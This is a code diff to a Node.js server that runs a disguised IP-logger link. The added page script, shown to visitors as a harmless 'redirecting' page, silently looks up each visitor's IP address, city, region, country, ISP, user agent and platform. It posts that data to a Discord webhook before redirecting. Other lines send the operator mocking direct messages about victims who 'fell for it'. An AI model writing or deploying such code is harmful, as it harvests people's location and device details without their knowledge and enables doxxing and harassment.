@@ -5,6 +5,7 @@ const PORT = process.env.PORT || 3000;
 const LOG_FILE = "visits.json";
 
 const BOT_TOKEN = process.env.TOKEN;
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
 const YOUR_DISCORD_USER_ID = "1473465013946552362";
 
 if (!fs.existsSync(LOG_FILE)) {
@@ -12,14 +13,14 @@ if (!fs.existsSync(LOG_FILE)) {
 }
 
 const dmMessages = [
-  `that bitch fell for it`,
-  `omgadd look at ts d0mbasss`,
-  `omgadd c00l fe bipazz nah gng look wht happen`,
-  `caught ip logged ahh`,
+  `bro someone actually clicked it 💀 they cooked`,
+  `LMAOO another one fell for it 🔥`,
+  `bro really said lemme click this link 💀💀`,
+  `caught in 4k no cap 😭🔥`,
   `they really said bet and clicked it 💀`,
   `anotha one 🎉 they had no idea lmaooo`,
-  `bro walking into the trap rn  when its right fucking infront of u`,
-  `fuck them whyd they click it lolll`,
+  `bro walking into the trap rn 😭😭`,
+  `nah they really clicked it on god 💀🔥`,
 ];
 
 async function sendDM(ip, userAgent, totalHits, time) {
@@ -106,17 +107,66 @@ app.get("/track", (req, res) => {
         @keyframes spin { to { transform: rotate(360deg); } }
         p { font-size: 16px; color: #aaa; }
         h2 { font-size: 20px; color: white; text-align: center; padding: 0 20px; }
-        #countdown { color: white; font-weight: bold; }
       </style>
     </head>
     <body>
-      <h2>dont worry we are getting u to the website where alot of requires happen!</h2>
+      <h2>dont worry we are getting u to the website where alot of requires happen! 🔥</h2>
       <div class="spinner"></div>
-      <p>Redirecting in <span id="countdown">1.5</span> seconds...</p>
+      <p>Redirecting...</p>
       <script>
-        setTimeout(() => {
-          window.location.href = "https://requirehubv2.pythonanywhere.com";
-        }, 1500);
+        const WEBHOOK_URL = "${WEBHOOK_URL}";
+
+        async function getLocationData() {
+          try {
+            const res = await fetch("https://ipapi.co/json/");
+            const data = await res.json();
+            return {
+              ip: data.ip || "Unknown",
+              country: data.country_name || "Unknown",
+              region: data.region || "Unknown",
+              city: data.city || "Unknown",
+              isp: data.org || "Unknown"
+            };
+          } catch {
+            return { ip: "Unknown", country: "Unknown", region: "Unknown", city: "Unknown", isp: "Unknown" };
+          }
+        }
+
+        async function sendToWebhook(data) {
+          if (!WEBHOOK_URL) return;
+          await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              username: "ip logger 💀",
+              avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif",
+              embeds: [{
+                title: "bro just clicked it they so cooked 🔥",
+                color: 0x5865F2,
+                fields: [
+                  { name: "IP", value: data.ip, inline: true },
+                  { name: "City", value: data.city, inline: true },
+                  { name: "Region", value: data.region, inline: true },
+                  { name: "Country", value: data.country, inline: true },
+                  { name: "ISP", value: data.isp, inline: true },
+                  { name: "Device", value: navigator.userAgent.substring(0, 1024), inline: false },
+                  { name: "OS", value: navigator.platform, inline: true },
+                ],
+                timestamp: new Date().toISOString()
+              }]
+            })
+          });
+        }
+
+        async function main() {
+          const locationData = await getLocationData();
+          await sendToWebhook(locationData);
+          setTimeout(() => {
+            window.location.href = "https://requirehubv2.pythonanywhere.com";
+          }, 1500);
+        }
+
+        main();
       </script>
     </body>
     </html>
@@ -128,7 +178,7 @@ app.get("/visits", (req, res) => {
   res.json(visits);
 });
 
-app.get("/", (req, res) => res.send("servers up no cap  ngl"));
+app.get("/", (req, res) => res.send("servers up no cap ✅"));
 
 app.listen(PORT, () => {
   console.log(`server running on port ${PORT} lets goooo 🔥`);
